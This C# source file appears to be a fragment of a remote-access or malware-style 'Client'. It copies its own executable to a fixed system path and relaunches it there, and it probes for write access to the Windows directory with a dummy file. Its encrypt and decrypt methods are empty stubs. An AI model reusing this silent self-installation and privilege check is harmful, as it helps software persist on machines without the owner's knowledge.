using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime;
using System.Diagnostics;

using System.IO;

namespace Client
{
    static class Utilites
    {
        
        internal static byte[] Encrypt(byte[] ar)
        {
            return new byte[0];
        }
        internal static byte[] Decrypt(byte[] ar)
        {
            return new byte[0];
        }

        internal static bool Install()
        {
            bool res = false;

            try
            {
                
                if(Application.ExecutablePath != Constants.SystemPath)
                {
                    File.Copy(Application.ExecutablePath, Constants.SystemPath, true);
                    Process.Start(Constants.SystemPath);              
                    res = true;
                }
            }
            catch
            {

            }
            return res;
        }
        internal static bool CanRWPI()
        {
            bool res = false;

            try
            {
                string file = Environment.GetEnvironmentVariable("windir") + "\\yctf.yc";
                
                if(File.Exists(file))
                {
                    File.Delete(file);
                }

                FileStream fs = File.Open(file,FileMode.Create);
                fs.Write(new byte[] { 97 },0,1);
                fs.Close();

                File.Delete(file);

                res = true;
            }
            catch
            {
            }

            return res;
        }
    }
}
